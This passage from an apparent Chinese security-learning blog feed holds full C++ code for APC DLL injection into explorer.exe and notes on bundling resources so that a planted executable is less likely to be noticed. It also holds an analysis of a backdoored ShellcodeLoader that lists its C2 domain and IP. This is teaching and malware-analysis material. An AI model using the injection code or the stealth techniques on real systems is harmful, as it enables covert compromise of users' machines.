class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ApcInject.h&quot;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>::<span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText);<br>::<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, szErr, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK | MB_ICONERROR);<br>&#125;<br><br><br><span class="hljs-comment">// 根据进程名称获取PID</span><br><span class="hljs-function">DWORD <span class="hljs-title">GetProcessIdByProcessName</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszProcessName)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwProcessId = <span class="hljs-number">0</span>;<br>PROCESSENTRY32 pe32 = &#123; <span class="hljs-number">0</span> &#125;;<br>HANDLE hSnapshot = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = FALSE;<br>::<span class="hljs-built_in">RtlZeroMemory</span>(&amp;pe32, <span class="hljs-built_in">sizeof</span>(pe32));<br>pe32.dwSize = <span class="hljs-built_in">sizeof</span>(pe32);<br><br><span class="hljs-comment">// 获取进程快照</span><br>hSnapshot = ::<span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hSnapshot)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);<br><span class="hljs-keyword">return</span> dwProcessId;<br>&#125;<br><br><span class="hljs-comment">// 获取第一条进程快照信息</span><br>bRet = ::<span class="hljs-built_in">Process32First</span>(hSnapshot, &amp;pe32);<br><span class="hljs-keyword">while</span> (bRet)<br>&#123;<br><span class="hljs-comment">// 获取快照信息</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == ::<span class="hljs-built_in">lstrcmpi</span>(pe32.szExeFile, pszProcessName))<br>&#123;<br>dwProcessId = pe32.th32ProcessID;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 遍历下一个进程快照信息</span><br>bRet = ::<span class="hljs-built_in">Process32Next</span>(hSnapshot, &amp;pe32);<br>&#125;<br><br><span class="hljs-keyword">return</span> dwProcessId;<br>&#125;<br><br><br><span class="hljs-comment">// 根据PID获取所有的相应线程ID</span><br><span class="hljs-function">BOOL <span class="hljs-title">GetAllThreadIdByProcessId</span><span class="hljs-params">(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>DWORD dwThreadIdLength = <span class="hljs-number">0</span>;<br>DWORD dwBufferLength = <span class="hljs-number">1000</span>;<br>THREADENTRY32 te32 = &#123; <span class="hljs-number">0</span> &#125;;<br>HANDLE hSnapshot = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = TRUE;<br><br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">// 申请内存</span><br>pThreadId = <span class="hljs-keyword">new</span> DWORD[dwBufferLength];<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pThreadId)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;new&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>::<span class="hljs-built_in">RtlZeroMemory</span>(pThreadId, (dwBufferLength * <span class="hljs-built_in">sizeof</span>(DWORD)));<br><br><span class="hljs-comment">// 获取线程快照</span><br>::<span class="hljs-built_in">RtlZeroMemory</span>(&amp;te32, <span class="hljs-built_in">sizeof</span>(te32));<br>te32.dwSize = <span class="hljs-built_in">sizeof</span>(te32);<br>hSnapshot = ::<span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hSnapshot)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取第一条线程快照信息</span><br>bRet = ::<span class="hljs-built_in">Thread32First</span>(hSnapshot, &amp;te32);<br><span class="hljs-keyword">while</span> (bRet)<br>&#123;<br><span class="hljs-comment">// 获取进程对应的线程ID</span><br><span class="hljs-keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)<br>&#123;<br>pThreadId[dwThreadIdLength] = te32.th32ThreadID;<br>dwThreadIdLength++;<br>&#125;<br><br><span class="hljs-comment">// 遍历下一个线程快照信息</span><br>bRet = ::<span class="hljs-built_in">Thread32Next</span>(hSnapshot, &amp;te32);<br>&#125;<br><br><span class="hljs-comment">// 返回</span><br>*ppThreadId = pThreadId;<br>*pdwThreadIdLength = dwThreadIdLength;<br>bRet = TRUE;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-keyword">if</span> (pThreadId)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pThreadId;<br>pThreadId = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br><br><span class="hljs-comment">// APC注入</span><br><span class="hljs-function">BOOL <span class="hljs-title">ApcInjectDll</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszProcessName, <span class="hljs-type">char</span>* pszDllName)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = FALSE;<br>DWORD dwProcessId = <span class="hljs-number">0</span>;<br>DWORD* pThreadId = <span class="hljs-literal">NULL</span>;<br>DWORD dwThreadIdLength = <span class="hljs-number">0</span>;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>PVOID pBaseAddress = <span class="hljs-literal">NULL</span>;<br>PVOID pLoadLibraryAFunc = <span class="hljs-literal">NULL</span>;<br>SIZE_T dwRet = <span class="hljs-number">0</span>, dwDllPathLen = <span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlen</span>(pszDllName);<br>DWORD i = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">// 根据进程名称获取PID</span><br>dwProcessId = <span class="hljs-built_in">GetProcessIdByProcessName</span>(pszProcessName);<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= dwProcessId)<br>&#123;<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 根据PID获取所有的相应线程ID</span><br>bRet = <span class="hljs-built_in">GetAllThreadIdByProcessId</span>(dwProcessId, &amp;pThreadId, &amp;dwThreadIdLength);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 打开注入进程</span><br>hProcess = ::<span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hProcess)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;OpenProcess&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 在注入进程空间申请内存</span><br>pBaseAddress = ::<span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pBaseAddress)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;VirtualAllocEx&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// 向申请的空间中写入DLL路径数据 </span><br>::<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pBaseAddress, pszDllName, dwDllPathLen, &amp;dwRet);<br><span class="hljs-keyword">if</span> (dwRet != dwDllPathLen)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;WriteProcessMemory&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取 LoadLibrary 地址</span><br>pLoadLibraryAFunc = ::<span class="hljs-built_in">GetProcAddress</span>(::<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pLoadLibraryAFunc)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;GetProcessAddress&quot;</span>);<br>bRet = FALSE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 遍历线程, 插入APC</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwThreadIdLength; i++)<br>&#123;<br><span class="hljs-comment">// 打开线程</span><br>hThread = ::<span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);<br><span class="hljs-keyword">if</span> (hThread)<br>&#123;<br><span class="hljs-comment">// 插入APC</span><br>::<span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryAFunc, hThread, (ULONG_PTR)pBaseAddress);<br><span class="hljs-comment">// 关闭线程句柄</span><br>::<span class="hljs-built_in">CloseHandle</span>(hThread);<br>hThread = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br>bRet = TRUE;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><br><span class="hljs-comment">// 释放内存</span><br><span class="hljs-keyword">if</span> (hProcess)<br>&#123;<br>::<span class="hljs-built_in">CloseHandle</span>(hProcess);<br>hProcess = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pThreadId)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pThreadId;<br>pThreadId = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h4><p>将上述函数编译为64位程序，在64位Windows10系统上直接运行，对资源管理器进程explorer.exe进行APC注入。</p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221027111041185.png" alt="image-20221027111041185"></h4>]]></content>
    
    
    <categories>
      
      <category>Windows黑客编程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础技术</title>
    <link href="/2022/10/25/%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/10/25/%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="第二章-基础技术"><a href="#第二章-基础技术" class="headerlink" title="第二章 基础技术"></a>第二章 基础技术</h2><h3 id="运行单一实例"><a href="#运行单一实例" class="headerlink" title="运行单一实例"></a>运行单一实例</h3><p>通过<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutex</a>函数来创建或者打开一个已命名或未命名的互斥对象，程序在每次运行的时候，通过判断系统中是否存在相同命名的互斥对象来确定程序是否重复运行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// 判断是否重复运行</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isalreadly</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hMutex = <span class="hljs-literal">NULL</span>;         <span class="hljs-comment">//定义句柄</span><br>    hMutex = ::<span class="hljs-built_in">CreateMutex</span>(<span class="hljs-literal">NULL</span>, FALSE, _T(<span class="hljs-string">&quot;TEST&quot;</span>));   <span class="hljs-comment">//创建互斥体</span><br>    <span class="hljs-keyword">if</span> (hMutex)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ERROR_ALREADY_EXISTS == ::<span class="hljs-built_in">GetLastError</span>())<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;                  <span class="hljs-comment">//互斥体存在，返回true，程序重复运行</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalreadly</span>())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已经运行\n&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;没有运行\n&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DLL延迟加载"><a href="#DLL延迟加载" class="headerlink" title="DLL延迟加载"></a>DLL延迟加载</h3><p>把必需的DLL文件以资源形式插入到程序中，并使用DLL延迟加载技术延迟加载。在正式调用必需的DLL之前，程序都是可以正常执行的。程序可以在这段时间内，把资源中的DLL释放到本地，等到正式调用DLL的时候释放的文件就会正确地加载执行。这样当使用程序的时候，只需把exe文件发送给用户，而不需要附加DLL文件了，也不需要担心程序会丢失DLL文件。</p><p>DLL延迟加载的具体设置步骤为：<br>属性–&gt;链接器–&gt;输入–&gt;延迟加载的DLL–&gt;输入：***.dll</p><h3 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h3><p>如果程序额外需要加载一些DLL文件、文本文件、图片文件，或者其他的音&#x2F;视频文件等，则可以把它们作为资源插入到程序里，等到程序运行后，再把它们释放到本地上。这样做的好处是编译出来的程序只有一个exe文件，而不需要附带其他文件，因而程序变得很简洁。只需把exe植入到用户计算机上，而不需要连同其他文件一起植入，这降低了被发现的风险。</p><p>新增自定义资源 <em>MYRES</em> 后，添加资源1.txt</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">FreeRes_ShowError</span><span class="hljs-params">(<span class="hljs-type">char</span>* pszText)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> szErr[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">wsprintf</span>(szErr, <span class="hljs-string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="hljs-built_in">GetLastError</span>());<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">FreeMyResource</span><span class="hljs-params">(UINT uiResourceName, <span class="hljs-type">char</span>* lpszResourceType, <span class="hljs-type">char</span>* lpszSaveFileName)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//获取指定模块里的资源</span><br>HRSRC hRsrc = ::<span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(uiResourceName), lpszResourceType);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hRsrc)<br>&#123;<br><span class="hljs-built_in">FreeRes_ShowError</span>(<span class="hljs-string">&quot;FindResource&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 获取资源的大小</span><br>DWORD dwSize = ::<span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, hRsrc);<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= dwSize)<br>&#123;<br><span class="hljs-built_in">FreeRes_ShowError</span>(<span class="hljs-string">&quot;SizeofResource&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 将资源加载到内存里</span><br>HGLOBAL hGlobal = ::<span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, hRsrc);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hGlobal)<br>&#123;<br><span class="hljs-built_in">FreeRes_ShowError</span>(<span class="hljs-string">&quot;LoadResource&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 锁定资源</span><br>LPVOID lpVoid = ::<span class="hljs-built_in">LockResource</span>(hGlobal);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpVoid)<br>&#123;<br><span class="hljs-built_in">FreeRes_ShowError</span>(<span class="hljs-string">&quot;LockResource&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 保存资源为文件</span><br>FILE* fp = <span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">fopen_s</span>(&amp;fp, lpszSaveFileName, <span class="hljs-string">&quot;wb+&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == fp)<br>&#123;<br><span class="hljs-built_in">FreeRes_ShowError</span>(<span class="hljs-string">&quot;LockResource&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-built_in">fwrite</span>(lpVoid, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), dwSize, fp);<br><span class="hljs-built_in">fclose</span>(fp);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-type">char</span> szSaveName[MAX_PATH] = <span class="hljs-string">&quot;1.txt&quot;</span>;<br><span class="hljs-comment">// 释放资源</span><br>BOOL bRet = <span class="hljs-built_in">FreeMyResource</span>(IDR_MYRES2, <span class="hljs-string">&quot;MYRES&quot;</span>, szSaveName);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Free Resource Error!&quot;</span>, <span class="hljs-string">&quot;ERROR&quot;</span>, MB_OK);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Free Resource OK!&quot;</span>, <span class="hljs-string">&quot;OK&quot;</span>, MB_OK);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows黑客编程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShellCodeLoader加载器投毒</title>
    <link href="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/"/>
    <url>/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/</url>
    
    <content type="html"><![CDATA[<p>项目地址<a href="https://github.com/ByPassAVTeam/ShellcodeLoader">https://github.com/ByPassAVTeam/ShellcodeLoader</a></p><p>项目已下架，从网上获取的样本包含两个文件，如下</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024130605852.png" alt="image-20221024130605852"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用msfvenom工具生成一个弹计算器的shellcode.bin文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin<br></code></pre></td></tr></table></figure><p>执行LoaderMaker.exe程序，生成1.exe。1.exe执行正常弹出计算器</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-131144.png" alt="屏幕截图-131144"></p><p>然后explorer会停止工作（推断是连接不到C2，目前C2地址解析到127.0.0.1）</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-131628.png" alt="屏幕截图-131628"></p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024135437373.png" alt="image-20221024135437373"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>主函数，包括打印、提权、加载ShellcodeLoader.exe</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024132539054.png" alt="image-20221024132539054"></p><p>注意打印函数sub_401950，多次进入该函数的下层函数，深藏着恶意代码。当打印次数等于6时，执行。上面打印的字符串刚好六次</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024133010750.png" alt="image-20221024133010750"></p><p>恶意函数会遍历进程，找到explorer.exe注入shellcode</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024133739838.png" alt="image-20221024133739838"></p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024143049177.png" alt="image-20221024143049177"></p><p>通过GetNativeSystemInfo或GetSystemInfo获取操作系统版本，判断是否为64位的操作系统，如果不是64位操作系统，则退出</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024134404666.png" alt="image-20221024134404666"></p><p>解码ShellCode，并注入到explorer.exe进程中</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024135004957.png" alt="image-20221024135004957"></p><p>929字节，标准的CS stager</p><p><img src="/2022/10/25/ShellCodeLoader%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%8A%95%E6%AF%92/image-20221024160955003.png" alt="image-20221024160955003"></p><p>看网上说利用了天堂之门技术，应该是有，但是没找到</p><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><p>md5:</p><p>11a3ba2a05482dab6a73cdb1bb26d455</p><p>23AAEFF0E4AF4009CF3EF1998769E8FA</p><p>9744E40686662B76689D9EDBB9EFD20F</p><p>C2:</p><p>www2.jquery.ink</p><p>121.5.147.81</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ShellCodeLoader投毒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Visual Studio Installer Project打包程序</title>
    <link href="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="1-安装Visual-Studio-Installer-Project"><a href="#1-安装Visual-Studio-Installer-Project" class="headerlink" title="1. 安装Visual Studio Installer Project"></a>1. 安装Visual Studio Installer Project</h3><p>在扩展-管理扩展-联机中，搜索<em><strong>Microsoft Visual Studio Installer Project</strong></em>，下载安装</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017132436631.png" alt="image-20221017132436631"></p><h3 id="2-新建Setup-Project"><a href="#2-新建Setup-Project" class="headerlink" title="2.新建Setup Project"></a>2.新建Setup Project</h3><p>右键解决方案，选择添加-新增项目，选择Setup Project</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017132537220.png" alt="image-20221017132537220"></p><p>点击下一步</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017132729949.png" alt="image-20221017132729949"></p><p>可以修改名称和位置，点创建</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017132820301.png" alt="image-20221017132820301"></p><h3 id="3-开始打包"><a href="#3-开始打包" class="headerlink" 